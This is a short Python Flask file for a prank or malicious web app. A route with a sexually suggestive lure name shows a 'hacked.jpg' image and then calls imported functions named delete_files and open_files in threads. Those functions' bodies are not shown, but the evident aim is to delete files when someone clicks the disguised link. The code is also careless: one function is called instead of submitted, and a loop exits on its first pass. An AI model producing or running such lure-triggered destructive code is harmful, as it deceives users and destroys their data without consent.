from delete_files import delete_files
from delete_files import open_files
import concurrent.futures
import os
from PIL import Image


from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def land():
    return render_template('lund.html')


@app.route('/video1_naughty_girlbangs')
def fuckit():

    for i in range(0,39):
        image = Image.open('static/images/hacked.jpg')
        image.show()
        break
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        # Execute the open_files function three times concurrently
        for _ in range(3):
            executor.submit(open_files)
            executor.submit(delete_files())


if __name__ == '__main__':
    app.run(debug=True)